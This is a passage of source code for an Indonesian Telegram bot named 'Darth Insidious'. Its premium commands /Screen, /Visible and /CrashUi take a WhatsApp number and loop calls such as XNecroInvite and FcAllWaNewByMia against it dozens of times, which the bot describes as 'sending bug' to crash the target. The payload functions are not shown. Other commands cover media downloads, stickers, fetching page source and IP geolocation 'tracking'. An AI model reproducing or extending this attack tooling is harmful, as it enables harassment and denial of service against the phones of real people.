  } catch (err) {
    console.error("DelayX Error:", err);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});



///----------( Screen )----------\\\
bot.onText(/\/Screen(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const args = match[1];

  if (!args) {
    return bot.sendMessage(
      chatId,
      `💢 *Contoh penggunaan yang benar:*` +
      `\`\`\`\n/Screen 62xxxxxxxxxx\n\`\`\`\n` +
      `🍂 *Keterangan:*\n` +
      `- 62xxxxxxxxxx → Nomor target WhatsApp\n\n` +
      `Contoh lain:\n\`\`\`\n/Screen 6281234567890\n\`\`\`\n` +
      `💢 Akses Terkirim!!.`,
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = args.trim();
  if (!/^\d+$/.test(targetNumber)) {
    return bot.sendMessage(chatId, "⚠️ Format salah!\nContoh: `/Visible 6281234567890`", {
      parse_mode: "Markdown",
    });
  }

  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const randomImage = getRandomImage();
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
💢 Hei Premium Only!
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "💢 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "⚠️ Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Screen
𖥂 Status : 💢 Mengirim Santet...
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
    parse_mode: "Markdown"
  });

  try {
    for (let i = 0; i < 50; i++) {
      await XNecroInvite(target);
      await new Promise(res => setTimeout(res, 300));
      await XNecroInvite(target);
      await new Promise(res => setTimeout(res, 300));
    }

    console.log(chalk.red(`Succes Sending Bug`));

    await bot.editMessageCaption(`\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Screen
𖥂 Status : Succesfuly Sending Bug
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 」", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    console.error("Screen Error:", err);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});



///----------( Visible )----------\\\
bot.onText(/\/Visible(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const args = match[1];

  if (!args) {
    return bot.sendMessage(
      chatId,
      `💢 *Contoh penggunaan yang benar:*` +
      `\`\`\`\n/Visible 62xxxxxxxxxx\n\`\`\`\n` +
      `🍂 *Keterangan:*\n` +
      `- 62xxxxxxxxxx → Nomor target WhatsApp\n\n` +
      `Contoh lain:\n\`\`\`\n/Visible 6281234567890\n\`\`\`\n` +
      `💢 Akses Terkirim!!.`,
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = args.trim();
  if (!/^\d+$/.test(targetNumber)) {
    return bot.sendMessage(chatId, "⚠️ Format salah!\nContoh: `/Screen 6281234567890`", {
      parse_mode: "Markdown",
    });
  }

  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const randomImage = getRandomImage();
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
💢 Hei Premium Only!
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "💢 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "⚠️ Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Visible
𖥂 Status : 💢 Mengirim Santet...
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
    parse_mode: "Markdown"
  });

  try {
    for (let i = 0; i < 80; i++) {
      await Nullvisible(Dilz, target);
      await new Promise(res => setTimeout(res, 400));
      await Nullvisible(Dilz, target);
      await new Promise(res => setTimeout(res, 400));
    }

    console.log(chalk.red(`Succes Sending Bug`));

    await bot.editMessageCaption(`\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Visible
𖥂 Status : Succesfuly Sending Bug
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 」", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    console.error("Screen Error:", err);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});



///----------( CrashUi )-----------\\\
bot.onText(/\/CrashUi(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const args = match[1];

  if (!args) {
    return bot.sendMessage(
      chatId,
      `💢 *Contoh penggunaan yang benar:*` +
      `\`\`\`\n/CrashUi 62xxxxxxxxxx\n\`\`\`\n` +
      `🍂 *Keterangan:*\n` +
      `- 62xxxxxxxxxx → Nomor target WhatsApp\n\n` +
      `Contoh lain:\n\`\`\`\n/CrashUi 6281234567890\n\`\`\`\n` +
      `💢 Akses Terkirim!!.`,
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = args.trim();
  if (!/^\d+$/.test(targetNumber)) {
    return bot.sendMessage(chatId, "⚠️ Format salah!\nContoh: `/CrashUi 6281234567890`", {
      parse_mode: "Markdown",
    });
  }

  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const randomImage = getRandomImage();
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
💢 Hei Premium Only!
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "💢 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "⚠️ Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : CrashUi
𖥂 Status : 💢 Mengirim Santet...
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
    parse_mode: "Markdown"
  });

  try {
    for (let i = 0; i < 70; i++) {
      await FcAllWaNewByMia(sock, target);
      await new Promise(res => setTimeout(res, 400));
    }

    console.log(chalk.red(`Succes Sending Bug`));

    await bot.editMessageCaption(`\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : CrashUi
𖥂 Status : Succesfuly Sending Bug
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 」", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    console.error("Screen Error:", err);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

// ========== TOOLS SAVE FILE ==========
bot.onText(/^\/tofile(?:\s+(\/)?(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  let fileName = match[2] ? match[2].trim() : "file";
  fileName = fileName.replace(/[^a-zA-Z0-9_\-]/g, "_");
  if (fileName.length === 0 || fileName === "_") fileName = "file";
  
  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, 
      "❌ *ERROR!*\nReply pesan yang ingin disimpan ke file.\n\nContoh:\n`/tofile scriptku`", 
      { parse_mode: "Markdown" }
    );
  }
  
  let content = "";
  const replyMsg = msg.reply_to_message;
  
  if (replyMsg.text) {
    content = replyMsg.text;
  } else if (replyMsg.caption) {
    content = replyMsg.caption;
  } else {
    return bot.sendMessage(chatId, 
      "❌ *ERROR!*\nPesan yang di-reply harus berisi teks.", 
      { parse_mode: "Markdown" }
    );
  }
  
  if (!content || content.trim().length === 0) {
    return bot.sendMessage(chatId, "❌ Konten kosong!", { parse_mode: "Markdown" });
  }
  
  if (!global.tempFileData) global.tempFileData = {};
  global.tempFileData[userId] = {
    content: content,
    fileName: fileName,
    chatId: chatId,
    timestamp: Date.now()
  };
  
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📄 TXT", callback_data: "save_txt" }, { text: "📜 JS", callback_data: "save_js" }, { text: "📦 JSON", callback_data: "save_json" }],
        [{ text: "🌐 HTML", callback_data: "save_html" }, { text: "🐍 PY", callback_data: "save_py" }, { text: "📝 LOG", callback_data: "save_log" }],
        [{ text: "❌ BATAL", callback_data: "save_cancel" }]
      ]
    }
  };
  
  const preview = content.length > 200 ? content.substring(0, 200) + '...' : content;
  
  await bot.sendMessage(chatId, 
    `📝 *Pilih format untuk* \`${fileName}\`\n\n📊 *Preview:*\n\`\`\`\n${preview}\n\`\`\``,
    { parse_mode: "Markdown", ...keyboard }
  );
});

// ========== HANDLER CALLBACK ==========
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const userId = query.from.id;
  const data = query.data;
  
  await bot.answerCallbackQuery(query.id).catch(() => {});
  
  if (!data || !data.startsWith('save_')) return;
  
  const temp = global.tempFileData?.[userId];
  
  if (!temp || temp.chatId !== chatId || Date.now() - temp.timestamp > 300000) {
    await bot.editMessageText("⚠️ *Session expired!* Kirim ulang `/tofile`", {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown"
    }).catch(() => {});
    delete global.tempFileData?.[userId];
    return;
  }
  
  if (data === 'save_cancel') {
    await bot.editMessageText("❌ *Dibatalkan!*", {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown"
    }).catch(() => {});
    delete global.tempFileData[userId];
    return;
  }
  
  const formats = {
    'save_txt': '.txt',
    'save_js': '.js',
    'save_json': '.json',
    'save_html': '.html',
    'save_py': '.py',
    'save_log': '.log'
  };
  
  const ext = formats[data] || '.txt';
  const fullName = temp.fileName + ext;
  let fileContent = temp.content;
  
  if (data === 'save_json') {
    try {
      const parsed = JSON.parse(fileContent);
      fileContent = JSON.stringify(parsed, null, 2);
    } catch (e) {
      await bot.editMessageText(`❌ *Bukan JSON valid!*\n\nError: ${e.message}`, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown"
      }).catch(() => {});
      delete global.tempFileData[userId];
      return;
    }
  }
  
  await bot.editMessageText(`⏳ *Membuat file* \`${fullName}\` *...*`, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "Markdown"
  }).catch(() => {});
  
  try {
    // ✅ KIRIM SEBAGAI TEKS DULU (paling aman, tidak pernah error)
    // Ini adalah solusi paling stabil untuk EFATAL
    
    await bot.sendMessage(chatId, 
      `✅ *File ${fullName} berhasil dibuat!*\n\n📁 *Konten file:*\n\`\`\`${ext === '.json' ? 'json' : (ext === '.js' ? 'javascript' : 'text')}\n${fileContent}\n\`\`\``,
      { parse_mode: "Markdown" }
    );
    
    // Opsional: coba kirim sebagai document juga (tapi kalau gagal, abaikan)
    try {
      const fs = require('fs');
      const tempFilePath = `/tmp/${fullName}`;
      fs.writeFileSync(tempFilePath, fileContent, 'utf-8');
      await bot.sendDocument(chatId, tempFilePath, {
        filename: fullName,
        caption: `📎 File attachment: ${fullName}`
      });
      fs.unlinkSync(tempFilePath);
    } catch (docErr) {
      // Abaikan, karena teks sudah terkirim
      console.log("SendDocument gagal, teks tetap terkirim");
    }
    
    await bot.deleteMessage(chatId, messageId).catch(() => {});
    
  } catch (err) {
    console.error("Error:", err);
    await bot.editMessageText(`❌ *Gagal!*\n\nError: ${err.message}`, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown"
    }).catch(() => {});
  }
  
  delete global.tempFileData[userId];
});

bot.onText(/\/spotify(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  let query = match[1];
  if (!query) {
    return bot.sendMessage(chatId,
      "❌ Contoh:\n<code>/spotify mencintaimu</code>",
      { parse_mode: "HTML" }
    );
  }

  query = query.trim();

  const loading = await bot.sendMessage(chatId, "⏳ Mencari lagu...");

  try {
    const url = `https://api.ikyyxd.my.id/search/spotifyplay?query=${encodeURIComponent(query)}`;
    const res = await axios.get(url);
    const data = res.data;

    if (!data.status || !data.result) {
      await bot.deleteMessage(chatId, loading.message_id);
      return bot.sendMessage(chatId, "❌ Lagu tidak ditemukan!");
    }

    const s = data.result;

    // ✅ PERBAIKAN: Pakai backtick ` untuk string multi-line
    const caption = `
<b>🎵 SPOTIFY PLAY DARTH INSIDIOUS</b>

<b>🎶 Title:</b> ${s.title}
<b>👤 Artist:</b> ${s.artist}
<b>💿 Album:</b> ${s.album}
<b>⏱ Duration:</b> ${s.duration}
<b>🔗 Spotify:</b> ${s.url}
<b>© Dilz Ganteng</b>
`.trim();

    if (s.download) {
      await bot.sendAudio(chatId, s.download, {
        title: s.title,
        performer: s.artist,
        caption: caption,
        parse_mode: "HTML"
      });
    } else {
      await bot.sendMessage(chatId, caption, {
        parse_mode: "HTML",
        disable_web_page_preview: true
      });
    }
    
    await bot.deleteMessage(chatId, loading.message_id);

  } catch (err) {
    console.log(err);

    try {
      await bot.deleteMessage(chatId, loading.message_id);
    } catch {}

    bot.sendMessage(chatId, "❌ Error saat memutar lagu!");
  }
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

///-----------( The Connect )----------\\\
bot.onText(/\/Getcode(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a website URL.\n\nExample:\n/Getcode https://example.com"
    );
  }

  const url = match[1].trim();
  const steps = [
    { percent: 10, text: "Meminta Persetujuan Url..." },
    { percent: 25, text: "Menghubungkan ke Sumber website..." },
    { percent: 45, text: "Mengambil kode sumber..." },
    { percent: 65, text: "Menganalisis struktur HTML..." },
    { percent: 85, text: "Menyusun hasil akhir..." },
    { percent: 100, text: "Selesai!.." }
  ];

  const processingMsg = await bot.sendMessage(
    chatId,
    `⏳ Proses pengambilan kode dari: ${url}\n0% Memulai...`
  );

  for (const step of steps) {
    await delay(600 + Math.random() * 400);
    await bot.editMessageText(
      `⏳ Proses pengambilan kode dari: ${url}\n${step.percent}% ${step.text}`,
      {
        chat_id: chatId,
        message_id: processingMsg.message_id
      }
    ).catch(() => {});
  }

  try {
    const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
    const res = await fetch(apiUrl);
    const data = await res.json();

    if (!data || !data.result) {
      return bot.editMessageText(
        "❌ Gagal mengambil source code. Pastikan URL valid.",
        {
          chat_id: chatId,
          message_id: processingMsg.message_id
        }
      );
    }

    const code = data.result;

    await delay(400);
    if (code.length > 4000) {
      const filePath = `sourcecode_${Date.now()}.html`;
      fs.writeFileSync(filePath, code);

      await bot.editMessageText(`🌹 Selesai! Mengirim file hasil dari: ${url}`, {
        chat_id: chatId,
        message_id: processingMsg.message_id
      });

      await bot.sendDocument(chatId, filePath, {
        caption: `🍒 Full source code from: ${url}`
      });

      fs.unlinkSync(filePath);
    } else {
      await bot.editMessageText(`🍒 Source Code from: ${url}\n\n<code>${code}</code>`, {
        chat_id: chatId,
        message_id: processingMsg.message_id,
        parse_mode: "HTML"
      });
    }
  } catch (err) {
    console.error("GetCode API Error:", err);
    await bot.editMessageText(
      "❌ Error saat mengambil data dari website. Silakan coba lagi.",
      {
        chat_id: chatId,
        message_id: processingMsg.message_id
      }
    );
  }
});

///----------( Instagram Url )----------\\\
const igCache = new Map();
const cooldown = new Set();

// ========== COMMAND INSTAGRAM ==========
bot.onText(/\/Instagram(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username || "No Username";
  
  let link = match[1];
  
  // Cek dari reply message
  if (!link && msg.reply_to_message && msg.reply_to_message.text) {
    const urls = msg.reply_to_message.text.match(/(https?:\/\/[^\s]+)/g);
    if (urls) link = urls[0];
  }

  if (cooldown.has(userId)) {
    return bot.sendMessage(chatId, "⏳ Tunggu 5 detik sebelum menggunakan lagi!");
  }
  
  if (!link || !link.includes("instagram.com")) {
    return bot.sendMessage(chatId, 
      "⚠️ *Link tidak valid!*\n\nCara penggunaan:\n1. Ketik `/Instagram https://instagram.com/...`\n2. Reply pesan yang berisi link Instagram",
      { parse_mode: "Markdown" }
    );
  }

  cooldown.add(userId);
  setTimeout(() => cooldown.delete(userId), 5000);

  igCache.set(userId, link);

  // Kirim pesan dengan tombol pilihan server langsung (tanpa GIF card)
  await bot.sendMessage(chatId, "📥 *Pilih server download untuk Instagram:*", {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "📀 INSTAGRAM V1", callback_data: "ig_v1" },
          { text: "📀 INSTAGRAM V2", callback_data: "ig_v2" }
        ],
        [
          { text: "📀 INSTAGRAM V3", callback_data: "ig_v3" }
        ]
      ]
    }
  });
});

// ========== CALLBACK HANDLER ==========
bot.on("callback_query", async (q) => {
  const userId = q.from.id;
  const chatId = q.message.chat.id;
  const msgId = q.message.message_id;
  const server = q.data;
  
  // Handle hanya untuk ig_*
  if (!server || !server.startsWith("ig_v")) return;
  
  const link = igCache.get(userId);

  if (!link) {
    await bot.answerCallbackQuery(q.id, {
      text: "❌ Link expired! Kirim ulang /Instagram",
      show_alert: true
    });
    await bot.deleteMessage(chatId, msgId);
    return;
  }

  await bot.answerCallbackQuery(q.id);
  
  // Hapus tombol
  await bot.editMessageReplyMarkup(
    { inline_keyboard: [] },
    { chat_id: chatId, message_id: msgId }
  ).catch(() => {});

  const statusMsg = await bot.sendMessage(chatId, "⏳ *Processing download...*", { parse_mode: "Markdown" });

  try {
    let videoUrl = null;
    let apiName = "";

    switch (server) {
      case "ig_v1":
        apiName = "API V1";
        const res1 = await axios.get(`https://api.deline.web.id/downloader/ig?url=${encodeURIComponent(link)}`, { timeout: 15000 });
        videoUrl = res1.data?.result?.media?.videos?.[0] || res1.data?.result?.url;
        if (!videoUrl && res1.data?.result?.url) videoUrl = res1.data.result.url;
        break;

      case "ig_v2":
        apiName = "API V2";
        const res2 = await axios.get(`https://ikyyzyyrestapi.my.id/download/igv2?url=${encodeURIComponent(link)}`, { timeout: 15000 });
        videoUrl = res2.data?.result?.[0]?.url || res2.data?.url;
        break;

      case "ig_v3":
        apiName = "API V3";
        const res3 = await axios.get(`https://api.zenzxz.my.id/download/instagram?url=${encodeURIComponent(link)}`, { timeout: 15000 });
        videoUrl = res3.data?.result?.url || res3.data?.video_url;
        break;
    }

    if (!videoUrl) throw new Error("Video URL tidak ditemukan");

    // Download video
    const videoBuffer = await axios.get(videoUrl, { responseType: "arraybuffer", timeout: 30000 });
    
    await bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
    await bot.sendVideo(chatId, Buffer.from(videoBuffer.data), {
      caption: `✅ *Video berhasil didownload!*\n📡 Server: ${apiName}\n👤 Request: @${q.from.username || userId}`,
      parse_mode: "Markdown"
    });

    // Hapus cache
    igCache.delete(userId);

  } catch (err) {
    console.error("Download error:", err.message);
    await bot.editMessageText(`❌ *Gagal download!*\n\nError: ${err.message}\n\nCoba pilih server lain.`, {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      parse_mode: "Markdown"
    }).catch(() => {
      bot.sendMessage(chatId, `❌ *Gagal download!*\n\nError: ${err.message}`, { parse_mode: "Markdown" });
    });
  }
});

///----------( Lacak Ip )----------\\\
bot.onText(/^\/DarthIP(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match && match[1] ? match[1].trim() : null;

  if (!ip) {
    return bot.sendMessage(chatId, "💢 ☇ Format: /DarthIP 8.8.8.8");
  }

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false;
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return bot.sendMessage(chatId, "❌ ☇ IP tidak valid. Masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar.");
  }

  let processingMsg = await bot.sendMessage(chatId, `🔎 ☇ Tracking IP ${ip} — sedang memproses...`);

  try {
    const steps = [
      { p: 10, text: "Menyiapkan koneksi ke server..." },
      { p: 30, text: "Mengambil data dari API..." },
      { p: 50, text: "Menganalisis lokasi IP..." },
      { p: 75, text: "Menyusun hasil akhir..." },
      { p: 100, text: "Selesai!" },
    ];

    for (const step of steps) {
      await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
      await bot.editMessageText(
        `🔎 ☇ Tracking IP ${ip}\n${step.p}% ${step.text}`,
        { chat_id: chatId, message_id: processingMsg.message_id }
      ).catch(() => {});
    }

    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return bot.editMessageText(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`, {
        chat_id: chatId,
        message_id: processingMsg.message_id,
      });
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + "," + lon)}` : null;

    const caption = `\`\`\`
⬡═―—⊱ ⎧ 𝐎𝐕𝐄𝐑 𝐅𝐋𝐎𝐖𝐗 ⎭ ⊰―—═⬡\`\`\`
⌑ IP: ${data.ip || "-"}
⌑ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⌑ Region: ${data.region || "-"}
⌑ City: ${data.city || "-"}
⌑ ZIP: ${data.postal || "-"}
⌑ Timezone: ${data.timezone_gmt || "-"}
⌑ ISP: ${data.isp || "-"}
⌑ Org: ${data.org || "-"}
⌑ ASN: ${data.asn || "-"}
⌑ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const options = {
      parse_mode: "Markdown",
      reply_markup: mapsUrl
        ? {
            inline_keyboard: [
              [{ text: "⌜🌍⌟ ☇ 𝖧𝖾𝗋𝖾", url: mapsUrl }]
            ]
          }
        : undefined,
    };

    await bot.editMessageText(caption, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
      ...options,
    }).catch(async () => {
      await bot.sendMessage(chatId, caption, options);
    });

  } catch (err) {
    console.error("TrackIP Error:", err);
    await bot.editMessageText(
      "❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti.",
      { chat_id: chatId, message_id: processingMsg.message_id }
    ).catch(async () => {
      await bot.sendMessage(chatId, "❌ ☇ Terjadi kesalahan saat mengambil data IP.");
    });
  }
});



///----------( IPhone Generaten )----------\\\
bot.onText(/^\/IPhoneQ(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>💢 𝖲𝗈𝗋𝗒𝗒 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 𝖴𝗌𝖾𝗋 𝖮𝗇𝗅𝗒!</blockquote>
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "『 𝖠𝗎𝗍𝗁𝗈𝗋 』", url: "https://t.me/dickxmod" }],
                    [{ text: "『 ! 』", url: "https://t.me/testidilz21" }]
                ]
            }
        });
    }
    
    
  if (!input) {
    return bot.sendMessage(chatId,
      "❌ Format salah.\n\nContoh:\n`/IPhoneQ Name | 21:45 | 77 | TELKOMSEL`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "00:00";
  const battery = parts[2] || "100";
  const carrier = parts[3] || "TELKOMSEL";

  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
